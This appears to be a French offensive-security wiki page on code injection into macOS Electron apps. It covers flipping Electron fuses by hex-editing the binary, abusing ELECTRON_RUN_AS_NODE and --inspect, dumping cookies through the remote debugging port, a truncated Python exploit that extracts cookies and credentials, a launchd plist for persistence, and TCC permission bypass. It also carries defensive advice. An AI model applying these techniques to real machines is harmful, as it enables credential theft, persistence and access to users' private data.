...
Ces techniques seront abordées ensuite, mais récemment, Electron a ajouté plusieurs **indicateurs de sécurité pour les empêcher**. Ce sont les [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), et voici ceux utilisés pour **empêcher** les applications Electron sur macOS de **charger du code arbitraire** :<sup>[[1]](#references)</sup>

- **`RunAsNode`** : si cette option est désactivée, elle empêche l'utilisation de la variable d'environnement **`ELECTRON_RUN_AS_NODE`** pour injecter du code.
- **`EnableNodeCliInspectArguments`** : si cette option est désactivée, les paramètres tels que `--inspect` et `--inspect-brk` ne seront pas pris en compte, ce qui empêche d'injecter du code de cette manière.
- **`EnableEmbeddedAsarIntegrityValidation`** : si cette option est activée, le **fichier** **`asar`** chargé sera **validé** par macOS, **empêchant** ainsi l'**injection de code** par modification du contenu de ce fichier.
...
- **`LoadBrowserProcessSpecificV8Snapshot`** : si cette option est activée, le browser process utilise le fichier nommé `browser_v8_context_snapshot.bin` pour son snapshot V8.

Un autre fuse intéressant, qui n'empêche pas l'injection de code, est :
...
```
Vous pouvez charger ce fichier dans [https://hexed.it/](https://hexed.it/) et rechercher la chaîne précédente. Après cette chaîne, vous pouvez voir en ASCII un nombre « 0 » ou « 1 » indiquant si chaque fuse est désactivé ou activé. Modifiez simplement le code hexadécimal (`0x30` correspond à `0` et `0x31` à `1`) pour **modifier les valeurs des fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Notez que si vous essayez d'**écraser** le binaire **`Electron Framework`** à l'intérieur d'une application avec ces octets modifiés, l'application ne fonctionnera pas.

## RCE : ajouter du code aux applications Electron
...
Selon [**la documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), si cette variable d'environnement est définie, le processus sera lancé comme un processus Node.js normal.<sup>[[6]](#references)</sup>
```bash
# Run this
...
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
Dans [**cet article de blog**](https://hackerone.com/reports/1274695), ce débogage est exploité pour faire **télécharger à un headless chrome des fichiers arbitraires vers des emplacements arbitraires**.<sup>[[8]](#references)</sup>

> [!TIP]
> Si une app dispose de sa propre méthode pour vérifier si des variables d’environnement ou des paramètres tels que `--inspect` sont définis, vous pouvez essayer de la **contourner** à l’exécution en utilisant l’argument `--inspect-brk`, qui **arrêtera l’exécution** au début de l’app et permettra d’exécuter un bypass (en écrasant par exemple les arguments ou les variables d’environnement du processus actuel).

L’exploit suivant consistait à monitorer et exécuter l’app avec le paramètre `--inspect-brk`, ce qui permettait de contourner la protection personnalisée mise en place (en écrasant les paramètres du processus pour supprimer `--inspect-brk`), puis à injecter un payload JS afin d’extraire les cookies et les identifiants de l’app :
```python
import asyncio
import websockets
import json
...
En utilisant le paramètre **`--remote-debugging-port=9222`**, il est possible de voler certaines informations depuis l’Electron App, comme l’**historique** (avec des commandes GET) ou les **cookies** du navigateur (car ils sont **décryptés** dans le navigateur et il existe un **endpoint json** qui les fournira).
...
Vous pouvez exploiter cette variable d'environnement dans un plist pour maintenir la persistance en ajoutant ces clés :
```xml
<dict>
<key>ProgramArguments</key>
<array>
...
```
## TCC Bypass via l’abus d’anciennes versions
...
Les techniques précédentes vous permettent d’exécuter du **code JS à l’intérieur du processus de l’application Electron**. Cependant, rappelez-vous que les **processus enfants s’exécutent avec le même profil de sandbox** que l’application parente et **héritent de ses permissions TCC**.\
...
Bien que l’équipe Electron ait contesté la gravité « critique » et indiqué qu’un attaquant devait déjà disposer d’une exécution de code locale, le problème reste utile pendant le post-exploitation, car il transforme n’importe quel bundle Electron vulnérable en binaire *living-off-the-land* pouvant, par exemple, lire les Contacts, les Photos ou d’autres ressources sensibles précédemment autorisées pour l’application de bureau.<sup>[[4]](#references)</sup>

Recommandations défensives des mainteneurs d’Electron :<sup>[[4]](#references)</sup>

* Désactivez les fuses `RunAsNode` et `EnableNodeCliInspectArguments` dans les builds de production.
* Utilisez la nouvelle API **UtilityProcess** si votre application a légitimement besoin d’un processus Node.js auxiliaire, au lieu de réactiver ces fuses.

## Injection automatique

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

L’outil [**electroniz3r**](https://github.com/r3ggi/electroniz3r) peut facilement être utilisé pour **rechercher les applications Electron vulnérables** installées et y injecter du code. Cet outil tentera d’utiliser la technique **`--inspect`** :
...
- [9] [La main dans le Cookie Jar : Dumping des cookies avec le port Remote Debugger de Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Déboguer les échecs du dumping des cookies avec le Remote Debugger de Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
